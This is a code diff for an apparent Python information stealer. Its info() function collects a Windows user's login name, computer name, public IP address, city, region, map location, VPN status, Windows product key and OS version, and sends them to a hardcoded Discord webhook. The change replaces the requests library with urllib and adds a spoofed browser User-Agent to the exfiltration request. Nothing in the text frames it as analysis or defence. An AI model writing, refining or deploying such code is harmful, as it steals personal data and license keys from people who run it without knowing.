@@ -66,7 +66,7 @@ hook = "https://discord.com/api/webhooks/1306568771644690542/jSSKvJ8P9PyM9Vgv2qv
 
 def info():
             import json
-            from urllib.request import urlopen
+            from urllib.request import urlopen, Request
             url = 'http://ipinfo.io/json'
             response = urlopen(url)
             data = json.load(response)
@@ -77,5 +77,8 @@ def info():
             process2 = subprocess.Popen("wmic os get Caption", stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL)
             wtype = process2.communicate()[0].decode().strip("Caption \n").strip()
             userdata = f"```\n------- {os.getlogin()} ------- \nComputername: {os.getenv('COMPUTERNAME')} \nIP: {data['ip']} \n -VPN: {UsingVPN} \nOrg: {data['org']} \nCity: {data['city']} \nRegion: {data['region']} \nWindowskey: {wkey} \nWindows Type: {wtype} \n```**Map location: {googlemap}** \n"
-            requests.post(hook,json={"content": f"{userdata}"})
+            content = {"content": f"{userdata}"}
+            use = json.dumps(content).encode('utf-8')
+            headers2 = {'Content-Type': 'application/json','User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'}
+            r=Request(hook,data=use,headers=headers2);req=urlopen(r)
 info()
